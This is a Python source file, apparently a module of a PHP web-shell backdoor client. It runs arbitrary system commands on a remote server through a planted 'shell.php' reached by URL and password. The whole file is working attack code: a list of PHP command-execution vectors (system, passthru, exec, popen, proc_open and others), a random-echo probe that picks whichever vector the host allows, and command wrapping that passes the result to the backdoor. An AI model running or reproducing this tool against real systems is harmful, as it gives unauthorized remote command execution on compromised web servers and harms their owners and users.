'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
from core.parameters import ParametersList, Parameter as P
import random

classname = 'Sh'
    
class Sh(Module):
    '''Shell to execute system commands
    
    Every run should be run_module to avoid recursive
    interpreter probing
    
    '''
    
    visible = False
    
    vectors = VectorList([
            Vector('shell.php', "system", "system('%s 2>&1');"),
            Vector('shell.php', "passthru" , "passthru('%s 2>&1');"),
            Vector('shell.php', "shell_exec", "echo shell_exec('%s 2>&1');"),
            Vector('shell.php', "exec", "exec('%s 2>&1', $r); echo(join(\"\\n\",$r));"),
            Vector('shell.php', "pcntl_exec", "$args = array('%s'); pcntl_exec( '%s', $args );"),
            Vector('shell.php', "popen", "$h = popen('%s','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);"),
            Vector('shell.php', "python_eval", "python_eval('import os; os.system('%s 2>&1');"),
            Vector('shell.php', "perl->system", "$perl = new perl(); $r = @perl->system('%s 2>&1'); echo $r;"),
            Vector('shell.php', "proc_open", """$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));                                                
$h = proc_open('%s', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096));
while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);
fclose($pipes[2]); proc_close($h);"""),
            ])
    
    
    params = ParametersList('System shell', vectors,
                    P(arg='cmd', help='Shell command', required=True, pos=0),
                    P(arg='stderr', help='Print standard error', default=True, type=bool)
                    )


    def __init__( self, modhandler , url, password):

        self.payload  = None
        self.cwd_vector = None

        try: 
            modhandler.load('shell.php')
        except ModuleException, e:
            raise
        else:
            Module.__init__(self, modhandler, url, password)
        
        
        
    def __execute_probe(self, vector):
        
        
        try:
            rand     = random.randint( 11111, 99999 )
            response = self.run_module( "echo %d" % rand, True, vector.payloads[0] )
            if response == str(rand):
                self.params.set_and_check_parameters({'vector' : vector.name})
                return True

        except:
            #pass
            raise
        return False
        
        
    def _probe( self ):

        vectors = self._get_default_vector2() 
        
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        
        
        for vector in vectors:
            response = self.__execute_probe(vector)
                
            if response:
                self.payload = vector.payloads[0]
                return

        
        raise ModuleException("shell.sh",  "Shell interpreter initialization failed")
                
              
    def run_module( self, cmd, err_to_stdout = True, payload = None ):
        
        if not payload: 
            payload = self.payload
            

        if err_to_stdout == False and ' 2>&1' in payload:
            payload = payload.replace(' 2>&1', '')

        if payload.count( '%s' ) == 1:
            payload = payload % cmd.replace( "'", "\\'" )
        else:
            args    = "','".join( cmd.split(' ')[1:] )
            cmd     = cmd.split()[0]
            payload = payload % ( args, cmd )
        
        return self.modhandler.load('shell.php').run_module(payload)



    
    
    